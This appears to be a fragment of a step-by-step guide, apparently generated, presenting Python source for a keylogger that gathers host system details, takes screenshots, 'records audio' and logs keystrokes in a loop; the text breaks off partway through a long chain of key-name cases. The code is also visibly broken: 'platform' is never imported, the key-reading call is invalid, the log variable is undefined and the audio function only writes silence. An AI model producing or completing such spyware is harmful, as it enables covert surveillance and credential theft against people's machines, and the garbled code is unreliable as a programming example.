import keyboard
import win32api
from pynput.keyboard import Key, Controller
import pyautogui
import pydub
import psutil
import os
import time

def get_system_info():
    system_info = {}
    system_info["OS"] = platform.system()
    system_info["OS Release"] = platform.release()
    system_info["OS Version"] = platform.version()
    system_info["Machine"] = platform.machine()
    system_info["Processor"] = platform.processor()
    system_info["Hostname"] = platform.node()
    return system_info

def take_screenshot():
    screenshot_path = "screenshot_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".png"
    pyautogui.screenshot(screenshot_path)

def record_audio():
    sample_rate = 400  
    seconds = 5  

    audio = pydub.AudioSegment.empty()

    for i in range(int(seconds * 10)):
        audio.append(pydub.AudioSegment.silent(duration=10))

    audio_path = "audio_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".wav"
    audio.export(audio_path, format="wav")


3. Create the main function to run the keylogger:
```python
def main():
    system_info = get_system_info()
    print("System Information:")
    print(system_info)

    while True:
        # Keystroke logging
        try:
            current_key = str(keyboard.Key.char)
            if current_key.isalnum() or current_key == " ":
                log += current_key
            elif current_key == "space":
                log += " "
            elif current_key == "backspace":
                log = log[:-1]
            elif current_key == "enter":
                log += "\n"
            elif current_key == "tab":
                log += "\t"
            elif current_key == "shift":
                log += "[SHIFT]"
            elif current_key == "ctrl":
                log += "[CTRL]"
            elif current_key == "alt":
                log += "[ALT]"
            elif current_key == "esc":
                log += "[ESC]"
            elif current_key == "caps lock":
                log += "[CAPS LOCK]"
            elif current_key == "num lock":
                log += "[NUM LOCK]"
            elif current_key == "scroll lock":
                log += "[SCROLL LOCK]"
            elif current_key == "page up":
                log += "[PAGE UP]"
            elif current_key == "page down":
                log += "[PAGE DOWN]"
            elif current_key == "home":
                log += "[HOME]"
            elif current_key == "end":
                log += "[END]"
            elif current_key == "left arrow":
                log += "[LEFT ARROW]"
            elif current_key == "right arrow":
                log += "[RIGHT ARROW]"
            elif current_key == "up arrow":
                log += "[UP ARROW]"
            elif current_key == "down arrow":
                log += "[DOWN ARROW]"
            elif current_key == "f1":
                log += "[F1]"
            elif current_key == "f2":
